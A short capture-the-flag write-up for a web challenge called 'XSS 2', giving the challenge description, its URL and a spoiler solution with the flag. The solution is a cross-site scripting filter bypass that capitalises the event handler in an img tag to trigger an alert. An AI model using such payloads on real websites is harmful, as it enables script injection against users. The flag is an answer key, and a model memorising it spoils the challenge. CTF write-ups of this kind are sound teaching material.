# XSS 2

## Authors

- Daniel Cooper

## Category

- web

## Description

Ok so it turns out you are an XSS enjoyer. I've upgraded my site now.

[https://xss2.ctf.secso.cc/](https://xss2.ctf.secso.cc/)

Author: @ssparrow

## Hints

## Files

## Solution

<details>
<summary>Spoiler</summary>

### Idea

This time we cannot use onerror or onload.

### Walkthrough

The same as for xss1, but this time we capitalize onerror like follows:

```
<img src=x ONERROR=alert(1)>
```

### Flag

`SPOOKTF{i_literally_cant_think_of_a_good_flag_name742873}`

</details>
